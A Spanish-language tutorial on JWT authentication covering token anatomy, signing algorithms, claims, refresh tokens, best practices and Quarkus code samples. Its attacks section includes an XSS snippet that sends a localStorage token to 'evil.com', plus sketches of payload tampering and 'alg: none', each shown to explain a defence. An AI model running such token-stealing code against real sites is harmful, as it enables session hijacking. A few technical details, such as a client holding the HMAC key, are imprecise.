# 📚 Teoría: Autenticación con JWT (JSON Web Token)

## 🎯 Introducción: ¿Por qué JWT?

Imagina que estás en un **festival de música con múltiples escenarios**. En lugar de tener que mostrar tu boleto y tu ID cada vez que entras a un escenario diferente (y que el staff tenga que revisar una lista gigante de asistentes), recibes una **pulsera holográfica** al entrar al festival. Esta pulsera:

- ✅ Tiene tu información grabada (nombre, tipo de acceso, fecha de caducidad)
- ✅ Está firmada criptográficamente (imposible de falsificar)
- ✅ Puede ser verificada por cualquier staff instantáneamente
- ✅ No requiere que consulten una base de datos central
- ✅ Es autocontenida: toda la info está en la pulsera

**JWT es esa pulsera holográfica en el mundo digital.** 🎫

---

## 📖 Definición Formal

**JWT (JSON Web Token)** es un estándar abierto ([RFC 7519](https://tools.ietf.org/html/rfc7519)) que define un método compacto y autocontenido para transmitir información de forma segura entre dos partes como un objeto JSON. Esta información puede ser verificada y confiada porque está firmada digitalmente.

### Características Principales

| Característica | Descripción |
|----------------|-------------|
| **Compacto** | Puede ser enviado en URLs, headers HTTP, o en cookies |
| **Autocontenido** | El token contiene toda la información necesaria |
| **Firmado** | Garantiza integridad usando HMAC o RSA |
| **Stateless** | No requiere almacenamiento del lado del servidor |
| **Transferible** | Puede pasar entre diferentes dominios y servicios |

---

## 🔬 Anatomía de un JWT

Un JWT está compuesto por **tres secciones** separadas por puntos (`.`):

```
HEADER.PAYLOAD.SIGNATURE
```

### Ejemplo Real

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJodHRwczovL3ZhdWx0Y29ycC5jb20iLCJzdWIiOiJlbXAwMDEiLCJlbWFpbCI6Imp1YW4ucGVyZXpAdmF1bHRjb3JwLmNvbSIsImdyb3VwcyI6WyJlbXBsb3llZSJdLCJpYXQiOjE3NjA3MzU0MjYsImV4cCI6MTc2MDczOTAyNn0.EHSdotHpooDc9lM6hbspdDXtf0uKM_u4GQ1wVXjx-Be-3twDWob6ehn8hQgzkkkBbC-DGSGwBWIljE9rTqAeSGBw23GH30kjLb1YlSS5RRCNdxFDog-knqkxEm-vyCPPNk5RfxZ29P1O9lrwfXRX4asKmYtbrD8A4iHTsqoH9MUQ1kkbGKFzkMm8AIUgTM2y7B1g6YXDmp5kyDFp2wKBo2JNVrdAHTj5Em5EMosvj5gVzfjhCEKDU-lVwP9gldtzKkEL2u6Cb25XKyIyjEMui6yW9yuCIyNNJQSwjCL0idF3zDm1Z2jIaKxavmgiESQFiTtkWenPXPltvFjxVtIDVQ
```

Parece un texto aleatorio, pero tiene una estructura muy definida.

---

### 1️⃣ HEADER (Cabecera)

**Formato codificado:**
```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9
```

**Decodificado (Base64):**
```json
{
  "alg": "RS256",
  "typ": "JWT"
}
```

**¿Qué contiene?**
- `alg`: Algoritmo de firma (RS256 = RSA con SHA-256)
- `typ`: Tipo de token (JWT)

**Analogía:** El header es como la **etiqueta del sobre** de una carta certificada, que indica cómo fue sellada y qué tipo de documento es.

---

### 2️⃣ PAYLOAD (Carga útil)

**Formato codificado:**
```
eyJpc3MiOiJodHRwczovL3ZhdWx0Y29ycC5jb20iLCJzdWIiOiJlbXAwMDEi...
```

**Decodificado (Base64):**
```json
{
  "iss": "https://vaultcorp.com",
  "sub": "emp001",
  "email": "juan.perez@vaultcorp.com",
  "groups": ["employee"],
  "iat": 1760735426,
  "exp": 1760739026,
  "jti": "c3439feb-516b-4ae0-9819-fedaa9f31b83"
}
```

**¿Qué contiene?**
Los **claims** (declaraciones) sobre el usuario y metadata del token.

**Analogía:** El payload es el **contenido de la carta**. Cualquiera que intercepte el sobre puede leerlo (no está encriptado), pero no puede modificarlo sin romper el sello.

---

### 3️⃣ SIGNATURE (Firma)

**Formato:**
```
EHSdotHpooDc9lM6hbspdDXtf0uKM_u4GQ1wVXjx-Be...
```

**¿Cómo se genera?**
```javascript
RSASHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  privateKey
)
```

**¿Qué garantiza?**
- ✅ **Integridad**: El contenido no ha sido modificado
- ✅ **Autenticidad**: Fue creado por quien dice serlo
- ❌ **NO garantiza confidencialidad**: El payload es legible

**Analogía:** La firma es como el **sello de lacre con el escudo de la familia** en las cartas medievales. Cualquiera puede ver la carta, pero solo quien tiene el anillo con el escudo puede crear ese sello. Si alguien modifica la carta, el sello se rompe.

---

## 🆚 Stateful vs Stateless: Batalla de Paradigmas

### Autenticación Stateful (Sesiones Tradicionales)

```
┌─────────────────────────────────────────────────────────┐
│                    AUTENTICACIÓN STATEFUL               │
└─────────────────────────────────────────────────────────┘

1. Login
   Cliente ──[user/pass]──> Servidor
   
2. Servidor crea sesión
   Servidor: sessionId = "abc123"
   Servidor: sessions["abc123"] = {userId: 1, email: "..."}
   [Guarda en memoria/Redis/BD]
   
3. Respuesta
   Servidor ──[Set-Cookie: sessionId=abc123]──> Cliente
   
4. Requests subsecuentes
   Cliente ──[Cookie: sessionId=abc123]──> Servidor
   
5. Servidor busca sesión
   Servidor: user = sessions["abc123"]
   [Consulta en memoria/Redis/BD]
   
6. Procesa request
   Servidor ──[Response]──> Cliente
```

**Ventajas:**
- ✅ Control total: el servidor puede invalidar sesiones
- ✅ Fácil revocar acceso inmediatamente
- ✅ Información sensible nunca sale del servidor

**Desventajas:**
- ❌ Requiere almacenamiento compartido (Redis)
- ❌ Difícil escalar horizontalmente
- ❌ Latencia por consultas constantes
- ❌ CORS complicado entre dominios

---

### Autenticación Stateless (JWT)

```
┌─────────────────────────────────────────────────────────┐
│                    AUTENTICACIÓN STATELESS              │
└─────────────────────────────────────────────────────────┘

1. Login
   Cliente ──[user/pass]──> Servidor
   
2. Servidor genera JWT
   Servidor: jwt = sign({userId: 1, email: "..."}, privateKey)
   [NO guarda nada en memoria]
   
3. Respuesta
   Servidor ──[{token: "eyJhbG..."}]──> Cliente
   
4. Requests subsecuentes
   Cliente ──[Authorization: Bearer eyJhbG...]──> Servidor
   
5. Servidor verifica firma
   Servidor: claims = verify(jwt, publicKey)
   [NO consulta base de datos]
   
6. Procesa request
   Servidor ──[Response]──> Cliente
```

**Ventajas:**
- ✅ No requiere almacenamiento en servidor
- ✅ Escala horizontalmente sin problemas
- ✅ Baja latencia (sin consultas a BD)
- ✅ Funciona perfecto entre dominios

**Desventajas:**
- ❌ No se puede revocar un token antes de su expiración
- ❌ El payload es visible (no confidencial)
- ❌ Tokens grandes pueden pesar en headers
- ❌ Requiere estrategias adicionales para logout

---

## 🔐 Criptografía: HMAC vs RSA

### HMAC (Simétrica)

**Analogía:** Es como tener una **llave única** que tanto abre como cierra la cerradura. Tanto el que crea el token como el que lo verifica necesitan la misma llave secreta.

```
┌──────────────────────────────────────────────────────┐
│                    HMAC (HS256)                      │
└──────────────────────────────────────────────────────┘

Firma:
  HMACSHA256(header + payload, SECRET_KEY)

Verificación:
  HMACSHA256(header + payload, SAME_SECRET_KEY) == signature?

┌─────────────┐              ┌─────────────┐
│   Servidor  │              │   Cliente   │
│             │              │             │
│ SECRET_KEY  │◄────────────►│ SECRET_KEY  │
│  (compartida)               (compartida) │
└─────────────┘              └─────────────┘
```

**Ventajas:**
- ✅ Más rápido computacionalmente
- ✅ Llaves más pequeñas

**Desventajas:**
- ❌ La misma clave firma y verifica
- ❌ Si se filtra, cualquiera puede crear tokens
- ❌ Difícil distribuir en microservicios

---

### RSA (Asimétrica)

**Analogía:** Es como el **sistema de apartados postales**. Tienes una ranura pública donde cualquiera puede dejar cartas (clave pública), pero solo tú tienes la llave que abre el buzón (clave privada).

```
┌──────────────────────────────────────────────────────┐
│                    RSA (RS256)                       │
└──────────────────────────────────────────────────────┘

Firma:
  RSASHA256(header + payload, PRIVATE_KEY)

Verificación:
  RSASHA256(header + payload, PUBLIC_KEY) == signature?

┌─────────────┐              ┌─────────────┐
│   Servidor  │              │  Servicios  │
│             │              │             │
│ PRIVATE_KEY │──JWT firmado─>│ PUBLIC_KEY  │
│ (secreta)   │              │ (pública)   │
│             │              │             │
│ Solo YO     │              │ Cualquiera  │
│ firmo       │              │ verifica    │
└─────────────┘              └─────────────┘
```

**Ventajas:**
- ✅ Separación de responsabilidades
- ✅ La clave pública puede distribuirse libremente
- ✅ Perfecto para microservicios
- ✅ Más seguro si se filtra la clave pública

**Desventajas:**
- ❌ Más lento computacionalmente
- ❌ Llaves más grandes (2048 bits típicamente)

---

### ¿Cuándo usar cada uno?

| Escenario | Recomendación |
|-----------|---------------|
| **Monolito** con un solo servidor | HMAC (HS256) |
| **Microservicios** distribuidos | RSA (RS256) ✅ |
| **API Gateway** + múltiples backends | RSA (RS256) ✅ |
| **SaaS Multi-tenant** | RSA (RS256) ✅ |
| **Aplicación móvil** que valida tokens | RSA (RS256) ✅ |
| **Performance crítica** con bajo tráfico | HMAC (HS256) |

**En nuestro ejercicio usamos RSA** porque simula un entorno de microservicios donde múltiples servicios pueden verificar tokens sin compartir la clave privada.

---

## 📋 Claims: El Corazón del JWT

Los **claims** son declaraciones sobre el usuario y metadata del token.

### Claims Registrados (Estándar RFC 7519)

| Claim | Nombre | Descripción | Ejemplo |
|-------|--------|-------------|---------|
| `iss` | Issuer | Quién emitió el token | `"https://vaultcorp.com"` |
| `sub` | Subject | Identificador del usuario | `"emp001"` |
| `aud` | Audience | Para quién es el token | `"vaultcorp-api"` |
| `exp` | Expiration | Timestamp de expiración | `1760739026` |
| `nbf` | Not Before | No válido antes de... | `1760735426` |
| `iat` | Issued At | Timestamp de emisión | `1760735426` |
| `jti` | JWT ID | Identificador único del token | `"abc-123-xyz"` |

### Claims Públicos (Estándar pero opcionales)

| Claim | Descripción | Ejemplo |
|-------|-------------|---------|
| `name` | Nombre completo | `"Juan Pérez"` |
| `email` | Email del usuario | `"juan@example.com"` |
| `email_verified` | Email verificado | `true` |
| `phone_number` | Teléfono | `"+56912345678"` |
| `preferred_username` | Username preferido | `"juanp"` |

### Claims Privados (Personalizados)

Puedes definir tus propios claims según las necesidades de tu aplicación:

```json
{
  "userId": "emp001",
  "department": "Engineering",
  "clearanceLevel": 3,
  "permissions": ["read", "write", "delete"],
  "organizationId": "org-456",
  "features": ["beta-testing", "advanced-analytics"]
}
```

**⚠️ Regla de Oro:** Nunca incluyas información sensible en el payload (contraseñas, números de tarjeta, etc.). El JWT **NO está encriptado**, solo codificado en Base64.

---

## ⏱️ Ciclo de Vida de un JWT

### 1. Generación del Token

```java
String jwt = Jwt.issuer("https://vaultcorp.com")
    .subject("emp001")                    // Usuario
    .claim("email", "juan@example.com")   // Metadata
    .groups(Set.of("employee"))           // Roles
    .issuedAt(Instant.now().getEpochSecond())      // Ahora
    .expiresAt(Instant.now().plusSeconds(3600).getEpochSecond())  // +1 hora
    .sign();  // Firma con private key
```

### 2. Transmisión

El cliente envía el token en **cada request** usando el header `Authorization`:

```http
GET /api/internal/secrets/my-secrets HTTP/1.1
Host: localhost:8080
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
```

### 3. Validación en el Servidor

```java
@Inject
JsonWebToken jwt;

@GET
@RolesAllowed("employee")
public Response getSecrets() {
    // Quarkus ya validó:
    // ✅ Firma es válida
    // ✅ Token no expiró
    // ✅ Issuer es correcto
    // ✅ Usuario tiene rol "employee"
    
    String userId = jwt.getSubject();  // "emp001"
    String email = jwt.getClaim("email");  // "juan@example.com"
    
    // Usar la información...
}
```

### 4. Expiración

```
Timeline del Token:
───────────────────────────────────────────────────────>
  ▲                                            ▲
  │                                            │
  iat: 14:00                                  exp: 15:00
  (issued at)                                 (expiration)
  
  │◄──────────── Token Válido (1 hora) ──────►│
                                               │
                                               │
                                         Token expira
                                         Usuario debe
                                         hacer login
                                         nuevamente
```

**¿Qué pasa cuando expira?**
- El servidor rechaza el token con `HTTP 401 Unauthorized`
- El cliente debe solicitar un nuevo token (login o refresh)

---

## 🔄 Refresh Tokens: Extendiendo Sesiones

**Problema:** Si los JWT duran 1 hora, el usuario debe hacer login cada hora. Esto es molesto.

**Solución:** Sistema de **Access Token + Refresh Token**

```
┌─────────────────────────────────────────────────────────┐
│            SISTEMA DE REFRESH TOKENS                    │
└─────────────────────────────────────────────────────────┘

1. Login inicial
   Cliente ──[user/pass]──> Servidor
   
2. Servidor retorna AMBOS tokens
   Servidor ──> Cliente
   {
     accessToken: "eyJhbG...",  // Expira en 15 minutos
     refreshToken: "xyz789...",  // Expira en 7 días
     expiresIn: 900
   }
   
3. Cliente usa accessToken
   Cliente ──[Bearer eyJhbG...]──> API
   
4. AccessToken expira (15 min)
   API ──[401 Unauthorized]──> Cliente
   
5. Cliente usa refreshToken para renovar
   Cliente ──[refreshToken: xyz789]──> /refresh
   
6. Servidor valida refreshToken y emite nuevo par
   Servidor ──> Cliente
   {
     accessToken: "eyJnbW...",  // Nuevo token
     refreshToken: "abc123...",  // Nuevo refresh
     expiresIn: 900
   }
```

**Ventajas:**
- ✅ Access tokens de corta vida (más seguro)
- ✅ Experiencia de usuario fluida
- ✅ Refresh tokens pueden ser revocados en BD

**Implementación típica:**
- **Access Token**: 15-30 minutos, stateless
- **Refresh Token**: 7-30 días, guardado en BD (stateful)

---

## 🛡️ Seguridad: Buenas Prácticas

### ✅ Qué HACER

| Práctica | Razón | Implementación |
|----------|-------|----------------|
| **Usar HTTPS** | Evitar interceptación | Siempre en producción |
| **Expiración corta** | Limitar ventana de ataque | 15-60 minutos |
| **Algoritmo fuerte** | Evitar ataques de fuerza bruta | RS256, ES256 |
| **Validar issuer** | Evitar tokens de otros sistemas | `mp.jwt.verify.issuer` |
| **Validar audience** | Token solo para tu API | `mp.jwt.verify.audiences` |
| **NO incluir secretos** | Payload es público | Solo IDs y roles |
| **Usar `jti` para revocación** | Blacklist de tokens | Cache Redis con TTL |
| **Clock skew tolerance** | Sincronización de servidores | `mp.jwt.verify.clock.skew=60` |

### ❌ Qué NO HACER

| Anti-patrón | Por qué es malo | Consecuencia |
|-------------|-----------------|--------------|
| **Guardar contraseñas en el token** | Payload es visible | Filtración de credenciales |
| **JWT sin expiración** | Token válido para siempre | Imposible revocar |
| **Usar `HS256` con clave débil** | Vulnerable a brute force | Tokens falsificados |
| **Guardar tokens en localStorage** | Vulnerable a XSS | Robo de tokens |
| **No validar signature** | Token puede ser modificado | Escalada de privilegios |
| **Reutilizar `jti`** | Replay attacks | Acceso no autorizado |

---

## 🎭 Ataques Comunes y Defensas

### 1. Modificación del Payload

**Ataque:**
```javascript
// Atacante decodifica el token
let payload = base64Decode(token.split('.')[1]);
payload = JSON.parse(payload);

// Intenta cambiar el rol
payload.groups = ["admin"];  // 🚨

// Re-codifica
let fakeToken = header + "." + base64Encode(payload) + "." + signature;
```

**Defensa:**
✅ La firma se invalida al modificar el payload. El servidor rechaza el token.

---

### 2. Algorithm Confusion (alg: none)

**Ataque:**
```json
{
  "alg": "none",  // 🚨
  "typ": "JWT"
}
```

El atacante cambia el algoritmo a `none` y elimina la firma.

**Defensa:**
```properties
# Quarkus solo acepta algoritmos explícitos
mp.jwt.verify.publickey.algorithm=RS256
```

---

### 3. Token Replay

**Ataque:** El atacante intercepta un token válido y lo reutiliza.

**Defensa:**
- Usar `jti` (JWT ID) único
- Implementar blacklist en cache (Redis)
- Expiración corta

```java
@Inject
@CacheName("jwt-blacklist")
Cache blacklist;

public boolean isTokenBlacklisted(String jti) {
    return blacklist.get(jti).await().indefinitely() != null;
}
```

---

### 4. XSS (Cross-Site Scripting)

**Ataque:** Inyectar JavaScript que robe tokens de `localStorage`.

```javascript
// Código malicioso inyectado
let token = localStorage.getItem('jwt');
fetch('https://evil.com/steal?token=' + token);
```

**Defensa:**
- ✅ Usar `httpOnly` cookies (no accesibles desde JS)
- ✅ Sanitizar inputs
- ✅ Content Security Policy (CSP)

```java
@GET
public Response login(...) {
    return Response.ok()
        .cookie(new NewCookie(
            "jwt",
            token,
            "/",
            null,
            null,
            3600,
            false,  // No SSL only en dev
            true    // httpOnly = true ✅
        ))
        .build();
}
```

---

## 📊 JWT vs Otros Métodos

### Comparativa Completa

| Característica | JWT | Session Cookies | OAuth2 Tokens | SAML |
|----------------|-----|-----------------|---------------|------|
| **Stateless** | ✅ | ❌ | ❌ (típicamente) | ❌ |
| **Tamaño** | Medio (1-2KB) | Pequeño (32 bytes) | Variable | Grande (5-10KB) |
| **Formato** | JSON | Session ID | Opaque Token | XML |
| **Revocación** | Difícil | Fácil | Fácil | Fácil |
| **Escalabilidad** | Alta | Media | Media | Baja |
| **CORS** | Simple | Complicado | Simple | Simple |
| **Mobile-friendly** | ✅ | ⚠️ | ✅ | ❌ |
| **Microservicios** | ✅ | ❌ | ✅ | ⚠️ |
| **Complejidad** | Baja | Muy baja | Alta | Muy alta |

---

## 🏗️ Arquitecturas con JWT

### Patrón 1: API Monolítica

```
┌──────────┐                    ┌──────────┐
│  Cliente │────────────────────│   API    │
│          │   Bearer Token     │          │
│          │◄───────────────────┤  (Genera │
│          │                    │   y      │
│          │                    │  Valida) │
└──────────┘                    └──────────┘
```

**Uso:** Aplicaciones simples, MVPs

---

### Patrón 2: Microservicios con API Gateway

```
                          ┌────────────┐
                          │ API Gateway│
                          │ (Valida    │
┌──────────┐              │  JWT)      │
│  Cliente │──Bearer─────>│            │
└──────────┘              └─────┬──────┘
                                │
                    ┌───────────┼───────────┐
                    ▼           ▼           ▼
              ┌─────────┐ ┌─────────┐ ┌─────────┐
              │Service A│ │Service B│ │Service C│
              │(Confía  │ │(Confía  │ │(Confía  │
              │ en JWT) │ │ en JWT) │ │ en JWT) │
              └─────────┘ └─────────┘ └─────────┘
```

**Uso:** Arquitecturas distribuidas

---

### Patrón 3: BFF (Backend For Frontend)

```
┌─────────┐       ┌─────────┐       ┌─────────┐
│  Web    │──────>│ Web BFF │──────>│         │
│  App    │       │         │       │         │
└─────────┘       └─────────┘       │   Auth  │
                                    │ Service │
┌─────────┐       ┌─────────┐       │         │
│ Mobile  │──────>│Mobile   │──────>│         │
│  App    │       │  BFF    │       │         │
└─────────┘       └─────────┘       └─────────┘
```

**Uso:** Diferentes experiencias por plataforma

---

## 🧪 Testing de JWT

### Unit Test

```java
@Test
public void testJwtGeneration() {
    JwtService service = new JwtService();
    
    String token = service.generateToken(
        "emp001",
        "juan@example.com",
        Set.of("employee")
    );
    
    // Decodificar para verificar
    String[] parts = token.split("\\.");
    String payload = new String(Base64.getDecoder().decode(parts[1]));
    
    assertTrue(payload.contains("emp001"));
    assertTrue(payload.contains("employee"));
}
```

### Integration Test

```java
@QuarkusTest
public class JwtResourceTest {
    
    @Test
    public void testProtectedEndpointWithValidToken() {
        // Generar token de prueba
        String token = getTestToken();
        
        given()
            .header("Authorization", "Bearer " + token)
        .when()
            .get("/api/internal/secrets/profile")
        .then()
            .statusCode(200)
            .body("userId", is("emp001"));
    }
    
    @Test
    public void testProtectedEndpointWithoutToken() {
        given()
        .when()
            .get("/api/internal/secrets/profile")
        .then()
            .statusCode(401);
    }
}
```

---

## 🎓 Conceptos Avanzados

### 1. Nested JWT (Encriptación + Firma)

```
JWE(JWS(payload))

Primero se firma:    JWS = sign(payload, privateKey)
Luego se encripta:   JWE = encrypt(JWS, publicKey)
```

**Uso:** Cuando el payload contiene información sensible

---

### 2. JWT con Roles Jerárquicos

```json
{
  "sub": "emp001",
  "roles": {
    "global": ["employee"],
    "org-456": ["admin", "billing"],
    "project-789": ["contributor"]
  }
}
```

**Uso:** Multi-tenancy, permisos granulares

---

### 3. JWT con Permisos (Claims-Based Authorization)

```json
{
  "sub": "emp001",
  "permissions": [
    "secrets:read:own",
    "secrets:write:own",
    "secrets:read:team",
    "users:read:all"
  ]
}
```

```java
@GET
@RequiresPermission("secrets:read:own")
public Response getMySecrets() { ... }
```

---

## 📚 Recursos Adicionales

### Especificaciones

- [RFC 7519 - JSON Web Token (JWT)](https://tools.ietf.org/html/rfc7519)
- [RFC 7515 - JSON Web Signature (JWS)](https://tools.ietf.org/html/rfc7515)
- [RFC 7516 - JSON Web Encryption (JWE)](https://tools.ietf.org/html/rfc7516)

### Herramientas

- [jwt.io](https://jwt.io) - Debugger online
- [jsonwebtoken.io](https://www.jsonwebtoken.io/) - Implementaciones por lenguaje
- [mkjwk.org](https://mkjwk.org/) - Generador de llaves

### Librerías

- **Java**: [jjwt](https://github.com/jwtk/jjwt), [jose4j](https://bitbucket.org/b_c/jose4j)
- **Node.js**: [jsonwebtoken](https://github.com/auth0/node-jsonwebtoken)
- **Python**: [PyJWT](https://github.com/jpadilla/pyjwt)
- **Go**: [jwt-go](https://github.com/golang-jwt/jwt)

---

## 🎯 Resumen Ejecutivo

### ¿Cuándo usar JWT?

✅ **SÍ usar JWT cuando:**
- Necesitas autenticación stateless
- Tienes microservicios distribuidos
- Requieres SSO (Single Sign-On)
- La escalabilidad horizontal es crítica
- Diferentes servicios necesitan validar tokens

❌ **NO usar JWT cuando:**
- Necesitas revocar tokens instantáneamente
- La aplicación es un monolito simple
- El payload requiere información sensible
- Los tokens cambiarán frecuentemente
- La latencia de consultar BD no es problema

### Puntos Clave

1. **JWT NO es encriptación**, es codificación + firma
2. **Stateless = Escalabilidad**, pero dificulta revocación
3. **RSA > HMAC** en microservicios
4. **Expiración corta** es crítica para seguridad
5. **NUNCA guardes secretos** en el payload
6. **HTTPS es obligatorio** en producción
7. **Refresh tokens** mejoran UX sin sacrificar seguridad

---

## 🧠 Preguntas de Autoevaluación

1. ¿Por qué JWT se considera "stateless"?
2. ¿Cuál es la diferencia entre `iat` y `exp`?
3. ¿Por qué RSA es mejor que HMAC para microservicios?
4. ¿Qué pasa si modifico el payload de un JWT?
5. ¿Cómo revoco un JWT antes de su expiración?
6. ¿Por qué no debo guardar contraseñas en el JWT?
7. ¿Cuál es el propósito del claim `jti`?
8. ¿Qué ventaja tienen los refresh tokens?
9. ¿Qué significa que JWT está "firmado" pero no "encriptado"?
10. ¿En qué header HTTP se envía el JWT?
